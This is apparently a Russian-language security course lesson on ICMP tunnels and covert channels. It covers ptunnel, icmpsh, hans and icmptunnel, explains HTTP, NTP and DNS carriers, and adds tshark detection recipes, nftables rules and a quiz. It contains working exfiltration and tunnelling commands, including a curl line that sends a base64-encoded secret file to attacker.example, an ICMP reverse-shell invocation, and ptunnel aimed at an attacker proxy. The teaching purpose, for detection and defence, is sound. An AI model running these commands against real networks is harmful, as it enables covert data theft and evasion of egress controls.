---
id: network-icmp-tunnel
title: "ICMP и другие туннели: ping, HTTP-инкапсуляция и covert-каналы"
category: network
parent: network-tunneling
difficulty: medium
order: 4
tags: [network, icmp, tunneling, covert-channel, ptunnel, exfiltration]
prerequisites: [network-covert, network-firewall-piercing]
useful_for:
  - "CTF Network (covert-каналы)"
  - "Пентест: эксфильтрация при строгом egress"
  - "Работа (SOC): детект необычного ICMP"
estimated_minutes: 45
summary: "Как устроены ICMP- и другие неочевидные туннели, как прятать данные в разрешённых протоколах и как это детектировать."
---

Когда периметр пропускает наружу только ICMP (ping), а нужен TCP — данные прячут в его payload. ICMP-туннели (и родственные covert-каналы в HTTP/NTP/DNS) обходят фильтры, но оставляют характерные следы. Урок опирается на [`network-covert`](network-covert) и [`network-firewall-piercing`](network-firewall-piercing).

## ICMP как канал

- **Echo Request/Reply** (`ping`) несут **payload** (до ~1472 байт), который редко инспектируется.
- **ptunnel** переносит TCP-сессию через ICMP Echo: клиент инкапсулирует данные, сервер отвечает.
- **icmpsh** — reverse shell через ICMP.
- **Hans, icmptunnel** — IP-over-ICMP.

```text
ping с payload -> сервер извлекает данные -> ответ с payload
```

## Другие covert-каналы

- **HTTP(S)**: данные в заголовках (`Cookie`, `User-Agent`, `X-*`) и URL; легитимный трафик маскирует объём.
- **DNS**: см. [`network-dns-tunnel`](network-dns-tunnel).
- **NTP**: младшие биты/поля пакета.
- **Timing**: кодирование задержками (см. `network-covert-timing`).
- **ICMPv6** и другие «безобидные» протоколы.

## Инструменты и команды

```bash
# ptunnel (сервер на внешнем хосте, клиент внутри)
ptunnel -p proxy.example.com -lp 2222 -da target.internal -dp 22
ssh -p 2222 user@127.0.0.1

# icmpsh (reverse shell)
./icmpsh_m.py <attacker_ip> <target_ip>

# Простая эксфильтрация через ping payload
ping -c 1 -p 41424344 target   # payload hex 41 42 43 44 = "ABCD"
# Разбор в tcpdump
tcpdump -i eth0 -n icmp -X

# HTTP-инкапсуляция (ручной PoC)
curl -s -H "X-Data: $(base64 < secret)" http://attacker.example/collect
```

## Разобранный пример: ICMP-туннель в лаборатории

```bash
# 1. Запуск сервера ptunnel на внешнем хосте
ptunnel -x password
# 2. Клиент внутри сети
ptunnel -p ext.example -lp 2222 -da internal.example -dp 22 -x password
# 3. SSH через туннель
ssh -p 2222 user@127.0.0.1
# 4. Наблюдаем трафик (для детекта)
tcpdump -i any -n 'icmp and greater 100' -c 20
# -> пинги с большим payload, высокая частота
```

## Детект (для SOC)

- **Размер и частота ICMP**: обычный ping — 64/98 байт и низкая частота; туннель — большой payload и постоянный поток.
- **Энтропия payload**: случайные/закодированные данные в ICMP.
- **Асимметрия**: много Echo Request без «нормальных» ответов.
- **HTTP-инкапсуляция**: аномальные заголовки/размеры, один и тот же URL.
- **NTP/NTP-амплификация** как прикрытие.

```bash
# Быстрый детект: необычные размеры ICMP
tshark -r cap.pcap -Y 'icmp.type==8' -T fields -e data.len | sort | uniq -c | sort -rn | head
```

## Защита

- Разрешать **только необходимые типы** ICMP (например, `echo-request` внутрь, `frag-needed`/`packet-too-big` для PMTU), а не блокировать всё.
- Ограничивать размер/частоту ICMP на периметре.
- DPI/IDS с правилами на ICMP-туннели.
- Egress-фильтрация и allowlist направлений.

## Частые ошибки

- **Блокировать весь ICMP** — сломает PMTU discovery и диагностику.
- **Игнорировать payload** — смотреть только на «ping есть/нет».
- **Думать, что ICMP не несёт данных** — payload до ~1472 байт.
- **Забывать про HTTP/NTP-каналы** — не только ICMP.
- **Не считать энтропию** — закодированные данные выделяются.
- **Путать нагрузку ICMP и нормальный большой ping** — нужен baseline.

## Инструменты в деталях

```bash
# ptunnel — TCP over ICMP
# сервер (внешний):  ptunnel -x secret
# клиент (внутри):   ptunnel -p ext -lp 2222 -da 10.0.0.5 -dp 22 -x secret
ssh -p 2222 user@127.0.0.1

# icmpsh — reverse shell через ICMP (сервер на атакующем)
./icmpsh_m.py <attacker_ip> <victim_ip>

# icmptunnel — IP-over-ICMP
./icmptunnel -s              # сервер
./icmptunnel <server_ip>     # клиент

# hans — IP-over-ICMP с шифрованием
hans -s 10.0.0.0/24 -f server; hans -c server
```

## Кодирование данных в ICMP

- **Payload** Echo Request/Reply (до ~1472 байт) — основной канал.
- **Размер пакета** как код (storage-канал).
- **Поля**: identifier/sequence, TTL — для скрытых битов.
- **Timing**: задержки между Echo.

```bash
# Простейшая эксфильтрация: payload hex
ping -c1 -p 666c6167 target          # payload "flag"
tcpdump -i eth0 -n -X icmp           # разбор
```

## Детект: практические правила

```bash
# Аномальные размеры ICMP
tshark -r cap.pcap -Y 'icmp.type==8' -T fields -e data.len | sort -n | uniq -c
# Частота пингов в секунду по источнику
tshark -r cap.pcap -Y 'icmp.type==8' -T fields -e ip.src -e frame.time_epoch | \
  awk '{print $1}' | sort | uniq -c | sort -rn | head
# Энтропия payload (грубо — доля непечатных байт)
tshark -r cap.pcap -Y 'icmp' -T fields -e data | head
```

Нормальный `ping` — фиксированные 32/64 байта payload и низкая частота. Всё, что отклоняется, — подозрительно.

## Комбинация с другими каналами

На практике атакующие комбинируют: DNS для коротких команд, ICMP для данных, HTTP для fallback. Детект должен покрывать **все** разрешённые протоколы, а не только ICMP. См. [`network-covert`](network-covert) и [`network-covert-timing`](network-covert-timing).

## ICMP изнутри: какие поля реально можно использовать

ICMP Echo Request/Reply — это 8 байт заголовка плюс произвольный **payload**:

| Поле | Размер | Обычное значение | Как используют в канале |
|---|---|---|---|
| type | 1 | 8 (request), 0 (reply) | кодовый бит при нестандартных типах |
| code | 1 | 0 | скрытые биты |
| checksum | 2 | пересчитывается | должен быть корректен |
| identifier | 2 | PID | метка сессии/потока |
| sequence | 2 | счётчик | порядковый номер чанка |
| payload | ~1472 | `abcdef…` или пусто | **основной канал** |

Стандартный `ping` шлёт payload из повторяющегося алфавита (`0x10..0x37`) или пустой. Любой «осмысленный» payload (высокая энтропия, base64, бинарные данные) — уже аномалия. Поле **identifier** удобно как «номер потока», а **sequence** — как номер чанка, что позволяет собирать многопоточные сессии.

```bash
# Вручную положить данные в ICMP payload (hex) — рудиментарная эксфильтрация
ping -c 3 -p 646174613d666c6167 target   # payload = "data=flag"
# Разобрать payload из дампа
tcpdump -r cap.pcap -nn -X 'icmp and greater 100'
```

## ptunnel: TCP поверх ICMP — архитектура и флаги

ptunnel инкапсулирует полноценную TCP-сессию в ICMP Echo. Схема: **клиент внутри сети** отправляет Echo Request с данными, **прокси-сервер снаружи** извлекает их, устанавливает реальное TCP-соединение к цели и возвращает ответ в Echo Reply.

```bash
# На внешнем (прокси) хосте — запускаем сервер с паролем
ptunnel -x MySecret -v
# На внутреннем хосте — клиент: локальный порт 2222 -> через ICMP -> SSH цели
ptunnel -p proxy.attacker.com -lp 2222 -da 10.0.0.5 -dp 22 -x MySecret -v
# Теперь это обычный локальный порт
ssh -p 2222 user@127.0.0.1
# Проверить туннель снифером
tcpdump -i eth0 -nn 'icmp and greater 64' -c 10
```

Флаги `-lp` (local port), `-da`/`-dp` (destination address/port), `-x` (пароль, защита от чужого использования), `-v` (verbose). ptunnel уязвим к тому, что «шумный» ICMP легко заметить — поэтому в реальных условиях его комбинируют с throttle и малым объёмом данных.

## hans и icmptunnel: полноценный IP-over-ICMP

Если нужен не один порт, а **весь IP-стек** через ICMP, используют `hans` или `icmptunnel`. Они поднимают `tun`-интерфейс и маршрутизируют через него трафик, шифруя (в hans) канал.

```bash
# hans: сервер и клиент
sudo hans -s 10.0.0.0/24 -f server -v          # сервер
sudo hans -c server -v                          # клиент
# icmptunnel: поднять tun и настроить маршруты
sudo ./icmptunnel -s &                          # сервер
sudo ./icmptunnel 10.0.0.1                      # клиент
sudo ip addr add 10.0.0.2/24 dev tun0
sudo ip route add 10.10.0.0/24 via 10.0.0.1 dev tun0
```

| Инструмент | Что переносит | Шифрование | Особенность |
|---|---|---|---|
| ptunnel | один TCP-порт | пароль-обфускация | простой, один туннель |
| icmptunnel | IP (tun) | нет | требует root и настройки маршрутов |
| hans | IP (tun) | да (AES) | есть `-f` для сервера |
| icmpsh | reverse shell | нет | минималистичный C2 |
| Scapy | произвольные поля | нет | для кастомных PoC |

## DNS, NTP и HTTP как альтернативные носители

ICMP — не единственный и не лучший канал. Сравнение по «сливаемости» с легитимным трафиком:

| Носитель | Полоса | Заметность | Когда выбирать |
|---|---|---|---|
| ICMP payload | средняя | средняя (payload виден) | разрешён только ping |
| DNS (поддомены/TXT) | низкая | низкая | разрешён только DNS наружу |
| HTTP(S) заголовки | высокая | очень низкая | есть исходящий веб |
| NTP | очень низкая | очень низкая | только NTP наружу (редко) |

**NTP-канал** прячет данные в младших битах полей (precision, poll, reference id) или в дополнительных «extension fields». **HTTP-канал** маскируется под обычный веб: данные в `Cookie`, `User-Agent`, `X-Request-ID`, теле POST или в пути URL. Главный принцип: чем «обычнее» протокол для периметра, тем незаметнее канал.

## Разбор ICMP-туннеля из PCAP: пошагово

```bash
# 1. Отфильтровать ICMP и посмотреть размеры payload
tshark -r cap.pcap -Y 'icmp.type==8' -T fields -e data.len | sort -n | uniq -c | sort -rn
# 2. Извлечь payload всех echo-request по порядку времени
tshark -r cap.pcap -Y 'icmp.type==8 && data.len>0' -T fields -e data \
  | tr -d '\n' | xxd -r -p > payload.bin
# 3. Оценить результат
file payload.bin && strings -n 6 payload.bin | head
# 4. Если данные в ответах (echo-reply), фильтровать icmp.type==0
tshark -r cap.pcap -Y 'icmp.type==0 && data.len>0' -T fields -e data | head
```

Частая CTF-ловушка: данные чередуются между request и reply, или кодируются не в payload, а в **порядке** пакетов/значении identifier. Тогда собирают последовательность и интерпретируют как байты/биты.

## Защита: что разрешать, а что блокировать

Полный запрет ICMP ломает диагностику и **PMTU discovery** (без `frag-needed`/`packet-too-big` крупные сессии зависают). Правильная политика — разрешать **только необходимые типы**:

- `echo-request` — если нужен мониторинг, но с ограничением размера/частоты;
- `destination-unreachable` (type 3), особенно `frag-needed` — **обязательно**;
- `time-exceeded` (type 11) — для traceroute;
- блокировать нестандартные типы и большой payload;
- DPI/IDS-правила на ICMP-туннели (ptunnel/hans/icmpsh), лимит байт в секунду;
- egress-allowlist по направлениям (не «любой ICMP куда угодно»).

```bash
# Пример правил (nftables): ограничить размер и частоту echo-request
nft add rule inet filter input icmp type echo-request icmp length 8-128 accept
nft add rule inet filter input icmp type echo-request drop
```

## Практический чек-лист: ICMP/covert-туннели

1. Есть ли ICMP наружу? Какой тип/размер обычно?
2. Найти Echo с непустым payload и нестандартным размером.
3. Проверить частоту и периодичность (туннель — постоянный поток).
4. Собрать payload в порядке времени, декодировать (hex/base64).
5. Проверить альтернативные носители: DNS, HTTP-заголовки, NTP.
6. Оценить энтропию payload — кодированные данные выделяются.
7. Для защиты: разрешить только нужные типы, лимиты, DPI, egress-allowlist.

## Квиз

```quiz
- question: "Почему ICMP удобен для covert-канала?"
  options:
    - "Он часто разрешён, а его payload редко инспектируется"
    - "Он шифрует данные"
    - "Он использует TCP"
    - "Он быстрее DNS"
  answer: 0
  explanation: "ICMP нужен для диагностики, поэтому обычно пропускается фильтрами."
- question: "Какой инструмент строит туннель поверх ICMP?"
  options:
    - "ptunnel"
    - "iodine"
    - "chisel"
    - "macof"
  answer: 0
  explanation: "ptunnel переносит TCP через ICMP Echo."
- question: "Какой признак выдаёт ICMP-туннель?"
  options:
    - "Большой/аномальный payload и высокая частота пингов"
    - "TTL=64"
    - "Короткие пинги"
    - "Использование HTTPS"
  answer: 0
  explanation: "Туннель несёт данные, увеличивая payload и частоту."
- question: "Где часто прячут данные в HTTP covert-канале?"
  options:
    - "В заголовках (Cookie, User-Agent) и URL"
    - "В статус-коде"
    - "В TLS-сертификате"
    - "В DNS-записи"
  answer: 0
  explanation: "Заголовки и URL — удобные места для данных, которые не инспектируются."
- question: "Почему нельзя просто заблокировать весь ICMP?"
  options:
    - "Сломается диагностика и PMTU discovery"
    - "Ускорится сеть"
    - "Отключится DNS"
    - "Пропадёт IPv6"
  answer: 0
  explanation: "Нужны отдельные типы ICMP (например, для MTU); блокировать всё — вредно."
```

## Где пригодится

- **CTF:** поиск данных в ICMP/странном трафике.
- **Пентест:** эксфильтрация при строгом egress.
- **SOC:** детект ICMP/HTTP-туннелей.
- **Red team:** скрытые каналы управления.
- **Сетевая инженерия:** корректная фильтрация ICMP.
